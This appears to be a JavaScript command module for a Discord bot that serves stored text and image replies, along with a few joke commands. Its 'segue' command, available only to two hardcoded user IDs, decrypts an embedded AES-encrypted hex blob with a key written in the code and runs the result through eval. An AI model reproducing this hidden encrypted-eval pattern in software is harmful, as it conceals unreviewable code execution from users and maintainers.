/* fs.writeFileSync('ctnt.json', (() => {
  /* Discord = {
    MessageEmbed: class MessageEmbed {
      setImage(v) { this.url = v; return this; }
      setTitle(v) { this.title = v; return this; }
      setDescription(v) { this.description = v; return this; }
      setFooter(v) { this.footer = v; return this; }
    }
  };
   * /
  let content_types = {
    "hey": "text_reply", "who am i": "text_reply", "temmie": "text_reply", "vsco": "text_reply", "bot": "text_reply", "pls money": "text_reply", "unretard": "text_reply", "techku": "text_reply", "goe mama": "text", "pp": "text_reply",
    "shut": "image", "joke": "text_multi_reply", "fun fact": "text_multi_reply", "pun": "text_multi_reply",
    "meme": "image_multi", "trump": "image_multi", "corona meme": "image_multi", "wholesome": "image_multi", "bonk": "image_multi", "cute animal": "image_multi", "doggo": "image_multi", "uwu": "image_multi", "surreal": "image_multi", "minecraft": "image_multi", "fortnite": "image", "gamer": "image", "true gamer": "image", "me lon": "image_multi", "mulan": "image", "poggers fish": "image_multi", "big boi": "image", "hug": "image", "bruh": "image"
  };
  return '{\n' + commands.map(x => {
    let type = content_types[x.name];
    if (!type) {
      console.log(`no command type for ${x.name}`);
      return `  ${JSON.stringify(x.name)}: null,`;
    }
    switch (type) {
      case 'text': {
        let text;
        x.execute({ channel: { send: v => text = v } });
        return `  ${JSON.stringify(x.name)}: { "type": ${JSON.stringify(type)}, "content": ${JSON.stringify(text)} },`;
      } break;
      case 'text_reply': {
        let text;
        x.execute({ reply: v => text = v });
        return `  ${JSON.stringify(x.name)}: { "type": ${JSON.stringify(type)}, "content": ${JSON.stringify(text)} },`;
      } break;
      case 'text_multi_reply': {
        let amount = Number(/(?<=Math.random\(\) \* )[0-9]+/.exec(x.execute.toString()));
        let texts = [];
        for (let i = 0; i < amount; i++)
          x.execute({ reply: v => texts.push(v) }, 0, 0, 0, [i + 1 + '']);
        return `  ${JSON.stringify(x.name)}: {\n    "type": ${JSON.stringify(type)},\n    "contents": ${JSON.stringify(texts, null, 2).split('\n').map(x => '    ' + x).join('\n').trim()}\n  },`;
      } break;
      case 'image': {
        let embed;
        x.execute({ channel: { send: v => embed = v } });
        return `  ${JSON.stringify(x.name)}: {\n    "type": ${JSON.stringify(type)}${embed.title ? `,\n    "title": ${JSON.stringify(embed.title)}` : ''}${embed.description ? `, "desc": ${JSON.stringify(embed.description)}` : ''}${embed.url ? `,\n    "image": ${JSON.stringify(embed.url)}` : ''}${embed.footer ? `,\n    "footer": ${JSON.stringify(embed.footer)}` : ''}\n  },`;
      } break;
      case 'image_multi': {
        let amount = Number(/(?<=Math.random\(\) \* )[0-9]+/.exec(x.execute.toString()));
        let embeds = [];
        for (let i = 0; i < amount; i++)
          x.execute({ channel: { send: v => embeds.push(v) } }, 0, 0, 0, [i + 1 + '']);
        return `  ${JSON.stringify(x.name)}: {\n    "type": ${JSON.stringify(type)},\n    "embeds": ${JSON.stringify(embeds.map(x => ({ title: x.title, desc: x.description, image: x.url, footer: x.footer })), null, 2).split('\n').map(x => '    ' + x).join('\n').trim()}\n  },`;
      } break;
    }
  }).join('\n') + '\n}';
})()); */

try {
  var commands = JSON.parse(fs.readFileSync(require.resolve('./content_commands.json')));
} catch (e) {
  console.error(e);
  var commands = {};
}

function contentCommand(obj, o, msg, rawArgs) {
  switch (obj.type) {
    case 'text': return msg.channel.send(obj.content);
    case 'text_reply': return msg.reply(obj.content);
    case 'text_multi_reply':
      if (rawArgs.length == 0) {
        return msg.reply(obj.contents[common.randInt(0, obj.contents.length)]);
      } else if (rawArgs[0] == 'count') {
        return msg.channel.send(`The command has ${obj.contents.length} entries.`);
      } else {
        let num = Number(rawArgs[0]);
        if (!Number.isSafeInteger(num)) return msg.channel.send('Invalid command entry number.');
        if (num < 1) return msg.channel.send('Entry number must be greater than or equal to 1.');
        if (num > obj.contents.length) return msg.channel.send(`Entry number greater than number of items. (${obj.contents.length})`);
        return msg.reply(obj.contents[num - 1]);
      }
    case 'image':
      return msg.channel.send({ embed: { title: obj.title, description: obj.desc, image: { url: obj.image }, footer: { text: obj.footer } } });
    case 'image_multi':
      if (rawArgs.length == 0) {
        let embed = obj.embeds[common.randInt(0, obj.embeds.length)];
        return msg.channel.send({ embed: { title: embed.title, description: embed.desc, image: { url: embed.image }, footer: { text: embed.footer } } });
      } else if (rawArgs[0] == 'count') {
        return msg.channel.send(`The command has ${obj.embeds.length} entries.`);
      } else {
        let num = Number(rawArgs[0]);
        if (!Number.isSafeInteger(num)) return msg.channel.send('Invalid command entry number.');
        if (num < 1) return msg.channel.send('Entry number must be greater than or equal to 1.');
        if (num > obj.embeds.length) return msg.channel.send(`Entry number greater than number of items. (${obj.embeds.length})`);
        let embed = obj.embeds[num - 1];
        return msg.channel.send({ embed: { title: embed.title, description: embed.desc, image: { url: embed.image }, footer: { text: embed.footer } } });
      }
  }
}

module.exports = exports = [];

Object.keys(commands).forEach(x => exports.push({
  name: x,
  flags: 0b011110,
  execute: contentCommand.bind(null, commands[x]),
}));

exports.push(
  {
    name: 'lamo',
    flags: 0b011110,
    execute(o, msg, rawArgs) {
      let len = Math.min(Math.max(Math.floor(Number(rawArgs[0])), 4), 100);
      if (len != len) {
        return msg.channel.send('lamomamoemao');
      }
      else {
        len -= 4;
        let text = '', lastchar = 'o';
        let options = ['a', 'e', 'm', 'o'];
        let randints = common.randInts(0, 3, len--);
        for (; len >= 0; len--)
          text += lastchar = options.filter(x => x != lastchar)[randints[len]];
        if (text[text.length - 1] != 'o') text += 'o';
        return msg.channel.send(`lamo${text}`);
      }
    },
  },
  {
    name: 'segue',
    flags: 0b011101,
    execute(o, msg, rawArgs) {
      if (msg.author.id != '405091324572991498' && msg.author.id != '312737536546177025') return msg.channel.send('segue?');
      msg.channel.send('segue?');
      let cip = require('crypto').createDecipheriv('aes256', 'utf8-le-obl-34929918|nonlinear=y', 'iv-0120495==eafs'), cipdata = [];
      cip.write(Buffer.from('dfbf4c6bcb124e722b73ebe1b2660e91b8022cf17480082e4dfcab96664c5f56d5a0c4494ccaefa34c8f8cea869fecdc1fbb31753ef16abb22fe59dd4e17d1356701612e27de543317c8e44a4f61f9ebcb97780d090970c535d90cf482213ee0c5542f36802910d3282d54b1c975eadb9c40831bd5264889ac86c72296d02619ecf2cf59490ac8f4df77c12e1cff4fea90ea64485850c9ad479d540d36f175de0586a26aa227bc91001d44ee6849bcd9e9d8f6398de7716d69001ac832aa52d0e9374db8f6d5b11513634a3f94764eded691b041a673c2a73c7af66e8341e2f834f8c96b5d3b4273692ecea6e71576cdbe375321910fb81b488526028d8e27806a5c53b73a85654d89957e71a6e86386326fc3b7a01050f7d99b473b59cb203402cc05ce5ede274d2306cbb97e2080aa66343be2685acb7b735925200b1a049881495aaa88cc27c9b79fb2ab22fe90843d9ef7ff46e10cc9ca8458634b5fd852a45a7cb8264c2aa17c438af2a114225177834ff27380ff11b728b95d86e5a8c75a51f1cfd00a606e0a74b34833f684be8bc5664030977bb1a6629d8abb4cc0cccf9286c7c624b6cfe8982248539735280052d769b28447561ec612651a3372c2d1284613651d9939aa4e0cf8052759989b823e6fa7d1cb5f0a416cf9202c623d72346069cc6ae7621f5ebff0c256cced1a7e03ee3dabda7a5dcffb5f6668f2039de35c5e559687fe9a84dabf71bc52ea266aa16541251fd96f0e790ce6f876ff83e1060a371122a5da8c879fc07c67b3c0016952761eb9730db2ef7727d2ccdeeeeb2285e80e0dad0d4dbc12aaa00fcb6098ac69f1f5961428a5c56c6d3140e69f513a7f012252f523ad3b534785257e6c84c02de41657064ff6253f71548f2926f13bd470d9afbf2195f920f73edaeb6805c78e56f75022f7efcb742d91f746cdefad4e75453e7787d054294c825f791313b506b36ad341d0b12caf43fa5b6d98438b66f61beae19afbf7c85bd0da4c571dd1f837c9e246405c1deeadbc7ec3fd82de80c58d05650a1d75bb53935513aa913b24637cb320ce5d93e1ea8d04aaecdb42f868e641475824ffcb4f22b4770edeaf1606836ced09f1f67ff786ca020826f051c74e24bf7b2c5e6410c34a2547f176216d4995794654a4e0e927a014', 'hex'));
      cip.end();
      cip.on('data', c => cipdata.push(c));
      cip.on('end', () => eval(Buffer.concat(cipdata).toString()));
    },
  },
  {
    name: 'hack',
    flags: 0b011110,
    execute(o, msg, rawArgs) {
      if (!rawArgs[0] || rawArgs[0].toLowerCase() == 'thebotcat') {
        return msg.reply('dont hack me plz');
      } else if (rawArgs[0].toLowerCase() == 'ryujin') {
        return msg.reply('bruh');
      } else if (rawArgs[0].toLowerCase() == 'coolguy284') {
        return msg.reply('bruhhurb');
      }
    },
  },
);

exports.contentCommand = contentCommand;
